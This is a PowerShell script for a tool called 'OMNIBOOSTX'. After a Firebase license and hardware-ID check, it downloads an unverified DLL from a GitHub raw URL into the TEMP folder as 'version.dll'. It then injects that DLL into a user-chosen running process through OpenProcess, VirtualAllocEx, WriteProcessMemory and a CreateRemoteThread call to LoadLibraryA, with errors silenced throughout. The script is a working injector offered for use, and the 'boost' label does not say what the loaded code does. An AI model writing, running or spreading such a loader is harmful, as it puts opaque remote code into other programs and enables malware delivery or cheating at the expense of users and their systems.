$ErrorActionPreference = "SilentlyContinue"

# --- [ CONFIGURATION ] ---
$DbUrl = "https://project-8a76e-default-rtdb.asia-southeast1.firebasedatabase.app/licenses"

function Get-HWID {
    return (Get-CimInstance Win32_ComputerSystemProduct).UUID
}
# -------------------------

# --- [ LOGIN SYSTEM ] ---
Clear-Host
Write-Host "--- SECXION SYSTEM LOGIN ---" -ForegroundColor Yellow
$key = Read-Host "Enter License Key"
$myHwid = Get-HWID

Write-Host "Connecting to Firebase..." -ForegroundColor Cyan

try {
    $data = Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Get

    if ($null -eq $data) {
        Write-Host "Error: Key not found in database!" -ForegroundColor Red
        Start-Sleep 2 ; exit
    }

    if ($data.status -ne "active") {
        Write-Host "Error: This key has been disabled or expired." -ForegroundColor Red
        Start-Sleep 2 ; exit
    }

    if ([string]::IsNullOrEmpty($data.hwid)) {
        $payload = @{ hwid = $myHwid } | ConvertTo-Json
        Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Patch -Body $payload
        Write-Host "Success: HWID registered to this PC!" -ForegroundColor Green
    } 
    elseif ($data.hwid -ne $myHwid) {
        Write-Host "Error: HWID Mismatch! Key is locked to another PC." -ForegroundColor Red
        Write-Host "Contact Admin to reset your HWID." -ForegroundColor Gray
        Start-Sleep 3 ; exit
    }

    Write-Host "Access Granted! Welcome." -ForegroundColor Green
    Start-Sleep 1

} catch {
    Write-Host "Connection Error! Check your internet or Firebase Rules." -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Gray
    Start-Sleep 3 ; exit
}

# --- CONFIGURATION ---
$GithubDllUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/d.dll"
$LocalDllPath = "$env:TEMP\version.dll"
# ---------------------

# 1. Download DLL from GitHub
Write-Host "[*] Downloading Critical Dll..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $GithubDllUrl -OutFile $LocalDllPath -ErrorAction Stop
    Write-Host "[+] Download Complete: $LocalDllPath" -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to download DLL. Check your URL!" -ForegroundColor Red
    return
}

# 2. Process Selection
Write-Host "[*] Fetching running processes..." -ForegroundColor Cyan
$Processes = Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object Name, Id, MainWindowTitle
$SelectedProcess = $Processes | Out-GridView -Title "Select Process to Boost with Dll" -OutputMode Single

if (-not $SelectedProcess) {
    Write-Host "[-] No process selected. Exiting." -ForegroundColor Yellow
    return
}

$ProcessName = $SelectedProcess.Name
$ProcessId = $SelectedProcess.Id
Write-Host "[*] Targeting: $ProcessName (PID: $ProcessId)" -ForegroundColor Magenta

# 3. Injection Logic (Win32 API)
$Win32Functions = @'
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
'@

$Kernel32 = Add-Type -MemberDefinition $Win32Functions -Name "Win32Inject" -PassThru -ErrorAction SilentlyContinue

$hProcess = $Kernel32::OpenProcess(0x1F0FFF, $false, $ProcessId)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "[-] Could not open process. Try running as Admin!" -ForegroundColor Red
    return
}

$DllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($LocalDllPath + "`0")
$AllocMem = $Kernel32::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$DllPathBytes.Length, 0x3000, 0x04)
$Kernel32::WriteProcessMemory($hProcess, $AllocMem, $DllPathBytes, [uint32]$DllPathBytes.Length, [ref]0)
$LoadLib = $Kernel32::GetProcAddress($Kernel32::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
$hThread = $Kernel32::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $LoadLib, $AllocMem, 0, [IntPtr]::Zero)

if ($hThread -ne [IntPtr]::Zero) {
    Write-Host "[+++] OMNIBOOSTX INJECTED SUCCESSFULLY!" -ForegroundColor Green -BackgroundColor DarkGreen
}
else {
    Write-Host "[-] Injection failed." -ForegroundColor Red
}
